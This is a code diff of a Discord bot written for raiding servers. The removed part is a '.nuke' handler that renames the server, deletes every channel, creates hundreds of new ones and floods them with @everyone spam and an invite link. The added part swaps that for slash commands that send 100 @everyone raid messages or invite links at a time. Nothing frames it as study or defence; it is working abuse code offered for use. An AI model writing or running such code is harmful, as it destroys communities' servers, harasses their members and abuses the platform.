@@ -1,48 +1,63 @@
-const { Client } = require('discord.js');
+const { Client, REST, Routes, SlashCommandBuilder } = require('discord.js');
 const http = require('http');
 
-const client = new Client({
-    intents: [1, 512, 32768, 2, 16]
-});
+const client = new Client({ intents: [1, 512, 32768] });
 
 const TOKEN = process.env.TOKEN;
+const CLIENT_ID = "1497740024983195668";
+
+const commands = [
+    new SlashCommandBuilder()
+        .setName('raid')
+        .setDescription('Spam the channel with JHUB')
+        .toJSON(),
+    new SlashCommandBuilder()
+        .setName('say')
+        .setDescription('Make the bot say something')
+        .addStringOption(opt =>
+            opt.setName('message')
+                .setDescription('What to say')
+                .setRequired(true))
+        .toJSON(),
+    new SlashCommandBuilder()
+        .setName('flood')
+        .setDescription('Spam discord.gg/jhub')
+        .toJSON()
+];
 
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Alive');
 }).listen(process.env.PORT || 3000);
 
-client.once('ready', () => {
+client.once('ready', async () => {
     console.log(`[+] ${client.user.tag} is ready`);
+    const rest = new REST({ version: '10' }).setToken(TOKEN);
+    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
+    console.log('[+] Slash commands registered');
 });
 
-const sleep = ms => new Promise(r => setTimeout(r, ms));
+client.on('interactionCreate', async (interaction) => {
+    if (!interaction.isChatInputCommand()) return;
 
-client.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-    if (message.content !== '.nuke') return;
-
-    message.delete().catch(() => {});
-    const g = message.guild;
-
-    g.setName('MOON OWNS U').catch(() => {});
-
-    const channels = Array.from(g.channels.cache.values());
-    for (const ch of channels) {
-        ch.delete().catch(() => {});
-        await sleep(100);
+    if (interaction.commandName === 'say') {
+        const msg = interaction.options.getString('message');
+        await interaction.reply({ content: 'Sent!', ephemeral: true });
+        await interaction.channel.send(msg);
     }
 
-    for (let i = 0; i < 500; i++) {
-        g.channels.create({ name: 'moon-owns-u', type: 0 }).then(ch => {
-            if (!ch) return;
-            for (let j = 0; j < 10; j++) {
-                ch.send(
-                    '@everyone @here discord.gg/vyngg https://cdn.discordapp.com/attachments/1138689071569444886/1290703239918129293/togif.gif?ex=69ef8690&is=69ee3510&hm=d1dbbf53c1ecc34d8e1058d2faebb76347792f01972da9c4099ce6b1b30d23a4&'
-                ).catch(() => {});
-            }
-        }).catch(() => {});
-        await sleep(200);
+    if (interaction.commandName === 'raid') {
+        await interaction.reply({ content: 'Spamming...', ephemeral: true });
+        for (let i = 0; i < 100; i++) {
+            interaction.channel.send('@everyone @here RAIDED BY discord.gg/jhub JHUB OWNS U').catch(() => {});
+        }
+    }
+
+    if (interaction.commandName === 'flood') {
+        await interaction.reply({ content: 'Flooding...', ephemeral: true });
+        for (let i = 0; i < 100; i++) {
+            interaction.channel.send('discord.gg/jhub').catch(() => {});
+        }
     }
 });
 
